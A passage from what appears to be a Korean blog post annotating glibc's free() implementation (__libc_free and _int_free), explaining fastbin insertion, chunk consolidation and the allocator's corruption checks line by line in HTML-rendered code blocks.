class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="comment">// munmap_chunk 함수 호출</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  <span class="comment">// ar_ptr에 chunk의 메모리를 비워야 하는 부분을 저장</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// _int_free 함수 호출</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">// 특정 chunk의 size</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">// 해제와 연관된 fastbin index</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">// 다음 index의 chunk</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">// 특정 chunk의 size</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  <span class="comment">// size에 할당을 해제할 chunk(p)의 size를 저장</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">      <span class="comment">// chunk의 크기를 음수로 바꿔 chunk의 주소랑 비교,</span></span><br><span class="line">      <span class="comment">// 만약 작거나, 해제하려는 chunk가 align이 되지 않을 경우</span></span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">      <span class="comment">// &quot;free(): invalid pointer&quot; exception 발생</span></span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  <span class="comment">// size가 chunk의 최소크기 보다 작거나, align되지 않을 경우</span></span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="comment">// &quot;free(): invaild size&quot; exception 발생</span></span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="comment">// 전달받은 chunk의 다음 chunk의 prev_inuse flag를 확인</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">  <span class="comment">// size가 fastbin 크기일 경우</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">// TRIM_FASTBINS가 set되어 있을경우 해당 조건 추가</span></span><br><span class="line"><span class="comment">// TRIM_FASTBINS가 set되지 않을경우 해당 조건을 추가하지 않고 진행</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">      <span class="comment">// chunk의 다음 chunk가 topchunk가 아니면  </span></span><br><span class="line">      <span class="comment">// (topchunk 바로 위에 있는 fastbin size chunk는 건드리지 않는다)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// 요청받은 chunk의 다음 chunk의 크기가 최소 크기보다 작거나, 최대 크기보다 클경우</span></span><br><span class="line">      &#123;</span><br><span class="line">      </span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">      <span class="comment">// __libc_free부터 넘겨받은 have_lock이 설정되어 있거나,</span></span><br><span class="line">      <span class="comment">// 다음 chunk size가 최소 크기보다 작거나, system_mem보다 크면</span></span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="comment">// &quot;free(): invalid next size (fast)&quot; exception 발생</span></span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">    <span class="comment">// have_lock이 설정되어있지 않으면</span></span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        <span class="comment">// mutex_unlock </span></span><br><span class="line">    locked = <span class="number">0</span>; </span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">// 해당 chunk free</span></span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="comment">// 현재 arena에 FASTCHUNKS_BIT 설정</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    <span class="comment">// size에 대한 fastbin index 저장</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">    <span class="comment">// index에 맞는 fastbin 저장</span></span><br><span class="line">    <span class="comment">// idx에는 fastbinY의 index가 저장, fb에는 index의 bin list가 저장 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// old = 이전에 해제한 포인터, p = 현재 해제할 포인터</span></span><br><span class="line">    <span class="comment">// old == p 라면 </span></span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="comment">// &quot;double free or corruption (fasttop)&quot; exception 발생</span></span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">// have_lock이 설정되어있고, 이전에 해제한 chunk가 있다면(old가 NULL이 아니라면)</span></span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      <span class="comment">// old_idx에 old 크기에 맞는 fast bin index 저장</span></span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">    <span class="comment">// 현재 해제할 chunk의 fd와 old2에 이전에 해제한 chunk(old) 저장</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line">    <span class="comment">// if(*fb == old2) &#123;*fb = p; return old2;&#125;가 될 때까지 반복.</span></span><br><span class="line">    <span class="comment">// 해제 요청을 받은 chunk를 fast bin에 넣는 작업</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// have_lock이 설정되어있고, old가 NULL이 아니고, old_idx와 idx가 다르면</span></span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">    <span class="comment">// &quot;invalid fastbin entry (free)&quot; exception 발생</span></span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">  <span class="comment">// 해제할 chunk의 is_mmapped flag가 설정되어 있지 않으면,</span></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    <span class="comment">// have_lock이 set되어 있지 않다면,</span></span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line">    <span class="comment">// nextchunk에 해제할 chunk의 다음 chunk 저장</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    <span class="comment">// 해제할 chunk가 top chunk 이면</span></span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="comment">// &quot;double free or corruption(top)&quot; exception 발생</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// 해제하려는 chunk의 크기만큼 뒤에 heap이 존재하는지 확인. 만약 없다면,</span></span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="comment">// &quot;double free or corruption(out)&quot; exception 발생 </span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">    <span class="comment">// 해제하려는 다음 chunk의 prev_inuse가 설정되어 있지 않다면 </span></span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="comment">// &quot;double free or corruption (!prev)&quot; exception 발생</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// 해제할 chunk의 다음 chunk의 크기를 nextsize에 저장</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    <span class="comment">// nextchunk의 크기가 최소 크기보다 작거나, system_mem보다 크면</span></span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">    <span class="comment">// &quot;free(): invalid next size(normal)&quot; exeception 발생</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">    <span class="comment">// 해제할 chunk를 free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    <span class="comment">// 해제할 chunk의 이전 chunk가 사용 중 이지 않을 경우</span></span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">      <span class="comment">// 이전 chunk와 병합</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">// 해제할 chunk의 다음 chunk가 topchunk가 아닐 경우</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">      <span class="comment">// 해제할 chunk의 다음 chunk의 다음 chunk의 prev_inuse flag를 저장</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      <span class="comment">// 만약 해제할 chunk의 다음 chunk가 사용중이 아니라면,</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 다음 chunk와 병합</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">      <span class="comment">// unsorted bin에 해제한 chunk 추가</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//해제할 chunk 다음 chunk가 top chunk인 경우</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">      <span class="comment">// topchunk와 병합</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    <span class="comment">// size가 FASTBIN 임계값 보다 크고</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">      <span class="comment">// fastbin이 존재하면</span></span><br><span class="line">malloc_consolidate(av);</span><br><span class="line">    <span class="comment">// fastbin 병합</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) </span><br><span class="line">      <span class="comment">// main_arena라면,</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">        <span class="comment">// topchunk 크기가 trim 임계값보다 크면</span></span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line">      <span class="comment">// systrim 호출</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// main_arena가 아니라면</span></span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">    <span class="comment">// heap_trim 